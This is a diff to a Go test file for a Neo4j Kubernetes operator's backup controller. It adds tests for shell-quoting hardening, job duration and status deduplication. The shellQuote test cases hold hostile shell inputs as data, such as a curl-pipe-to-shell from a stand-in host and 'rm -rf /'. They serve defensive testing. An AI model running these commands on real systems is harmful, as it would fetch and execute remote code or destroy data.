@@ -11,15 +11,44 @@ You may obtain a copy of the License at
 package controller
 
 import (
+	"context"
 	"testing"
 	"time"
 
+	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/require"
 	batchv1 "k8s.io/api/batch/v1"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
+	"k8s.io/apimachinery/pkg/runtime"
 	"k8s.io/apimachinery/pkg/types"
+	clientgoscheme "k8s.io/client-go/kubernetes/scheme"
+	"k8s.io/client-go/tools/record"
+	"sigs.k8s.io/controller-runtime/pkg/client"
+	"sigs.k8s.io/controller-runtime/pkg/client/fake"
 
 	neo4jv1beta1 "github.com/neo4j-partners/neo4j-kubernetes-operator/api/v1beta1"
 )
+
+// newBackupTestReconcilerWithStatus wires a Neo4jBackupReconciler against a
+// fake client that tracks the status subresource separately. Required for
+// any test that exercises r.Status().Update — without WithStatusSubresource,
+// fake client silently drops status writes, hiding real behaviour.
+func newBackupTestReconcilerWithStatus(t *testing.T, objs ...client.Object) *Neo4jBackupReconciler {
+	t.Helper()
+	scheme := runtime.NewScheme()
+	require.NoError(t, clientgoscheme.AddToScheme(scheme))
+	require.NoError(t, neo4jv1beta1.AddToScheme(scheme))
+	c := fake.NewClientBuilder().
+		WithScheme(scheme).
+		WithObjects(objs...).
+		WithStatusSubresource(&neo4jv1beta1.Neo4jBackup{}).
+		Build()
+	return &Neo4jBackupReconciler{
+		Client:   c,
+		Scheme:   scheme,
+		Recorder: record.NewFakeRecorder(16),
+	}
+}
 
 // Unit tests for the history helpers added in #118. Kept as pure-function
 // tests because the end-to-end "Job patched to Succeeded → controller appends
@@ -135,4 +164,134 @@ func TestBackupRunAlreadyRecorded(t *testing.T) {
 			}
 		})
 	}
+}
+
+func TestShellQuote(t *testing.T) {
+	// Hardening for backup.Spec.Options.AdditionalArgs (issue #117-adjacent).
+	// Single-quoted shell strings disable every metacharacter except a single
+	// quote, which is escaped by closing → emitting `\'` → reopening.
+	cases := []struct {
+		name string
+		in   string
+		want string
+	}{
+		{"plain flag", "--verbose", "'--verbose'"},
+		{"flag with =value", "--include=neo4j", "'--include=neo4j'"},
+		{"dollar must not expand", "$HOME", `'$HOME'`},
+		{"command substitution backticks", "`whoami`", "'`whoami`'"},
+		{"command substitution dollar-paren", "$(curl evil.sh|sh)", `'$(curl evil.sh|sh)'`},
+		{"semicolon must not terminate", "; rm -rf /", "'; rm -rf /'"},
+		{"single quote inside arg", "a'b", `'a'\''b'`},
+		{"empty string", "", "''"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			got := shellQuote(tc.in)
+			if got != tc.want {
+				t.Errorf("shellQuote(%q) = %q, want %q", tc.in, got, tc.want)
+			}
+		})
+	}
+}
+
+func TestJobDuration(t *testing.T) {
+	// Issue: handleExistingBackupJob used time.Now() captured at reconcile
+	// entry, so the metric reported reconcile cost (milliseconds) instead of
+	// the actual backup duration. jobDuration derives from Job timestamps so
+	// the metric stays accurate regardless of when reconcile observes the Job.
+	start := metav1.NewTime(time.Date(2026, 6, 2, 10, 0, 0, 0, time.UTC))
+	end := metav1.NewTime(start.Add(2 * time.Minute))
+
+	t.Run("both times present → completion - start", func(t *testing.T) {
+		got := jobDuration(&batchv1.Job{
+			Status: batchv1.JobStatus{StartTime: &start, CompletionTime: &end},
+		})
+		assert.Equal(t, 2*time.Minute, got)
+	})
+
+	t.Run("only StartTime → since(StartTime)", func(t *testing.T) {
+		// Edge case: Failed observed before CompletionTime is written.
+		past := metav1.NewTime(time.Now().Add(-90 * time.Second))
+		got := jobDuration(&batchv1.Job{
+			Status: batchv1.JobStatus{StartTime: &past},
+		})
+		// Allow generous slack — go test isn't deterministic about clock skew.
+		assert.GreaterOrEqual(t, got, 89*time.Second)
+		assert.Less(t, got, 95*time.Second)
+	})
+
+	t.Run("no StartTime → zero", func(t *testing.T) {
+		assert.Equal(t, time.Duration(0), jobDuration(&batchv1.Job{}))
+	})
+
+	t.Run("nil Job → zero", func(t *testing.T) {
+		assert.Equal(t, time.Duration(0), jobDuration(nil))
+	})
+}
+
+// Regression for the issue #117-adjacent dedup-path fix: a duplicate call to
+// updateBackupStats must NOT bump resourceVersion (return early) and a
+// first-time call must still update Stats and prepend the History entry.
+// Previously the diff that introduced dedup left Stats unconditionally
+// written before the dedup check; a draft fix would have inverted that and
+// silently dropped Stats updates for legitimate first-time calls.
+func TestUpdateBackupStatsDedup(t *testing.T) {
+	ctx := context.Background()
+	ns := "default"
+
+	start := metav1.NewTime(time.Date(2026, 6, 2, 10, 0, 0, 0, time.UTC))
+	end := metav1.NewTime(start.Add(45 * time.Second))
+	jobA := &batchv1.Job{
+		ObjectMeta: metav1.ObjectMeta{UID: types.UID("uid-A")},
+		Status:     batchv1.JobStatus{Succeeded: 1, StartTime: &start, CompletionTime: &end},
+	}
+	jobB := &batchv1.Job{
+		ObjectMeta: metav1.ObjectMeta{UID: types.UID("uid-B")},
+		Status:     batchv1.JobStatus{Succeeded: 1, StartTime: &start, CompletionTime: &end},
+	}
+	backup := &neo4jv1beta1.Neo4jBackup{
+		ObjectMeta: metav1.ObjectMeta{Name: "b", Namespace: ns},
+	}
+	// Local helper because newBackupTestReconciler doesn't register
+	// Neo4jBackup as having a status subresource — without that,
+	// fake-client's Status().Update silently no-ops, masking real behaviour.
+	r := newBackupTestReconcilerWithStatus(t, backup)
+
+	get := func() *neo4jv1beta1.Neo4jBackup {
+		t.Helper()
+		got := &neo4jv1beta1.Neo4jBackup{}
+		require.NoError(t, r.Get(ctx, client.ObjectKey{Name: "b", Namespace: ns}, got))
+		return got
+	}
+
+	t.Run("first call writes Stats and prepends history", func(t *testing.T) {
+		r.updateBackupStats(ctx, backup, jobA)
+
+		got := get()
+		require.NotNil(t, got.Status.Stats, "Stats must be set after first call")
+		assert.Equal(t, "45s", got.Status.Stats.Duration)
+		require.Len(t, got.Status.History, 1)
+		assert.Equal(t, "uid-A", got.Status.History[0].RunID)
+	})
+
+	t.Run("duplicate call is a no-op (no resourceVersion bump)", func(t *testing.T) {
+		before := get()
+		rvBefore := before.ResourceVersion
+
+		r.updateBackupStats(ctx, backup, jobA) // same Job UID
+
+		after := get()
+		assert.Equal(t, rvBefore, after.ResourceVersion, "duplicate updateBackupStats must not write")
+		require.Len(t, after.Status.History, 1, "history must stay at length 1")
+	})
+
+	t.Run("new Job UID appends a second history entry", func(t *testing.T) {
+		r.updateBackupStats(ctx, backup, jobB)
+
+		got := get()
+		require.Len(t, got.Status.History, 2)
+		// Newest first per the prepend convention.
+		assert.Equal(t, "uid-B", got.Status.History[0].RunID)
+		assert.Equal(t, "uid-A", got.Status.History[1].RunID)
+	})
 }
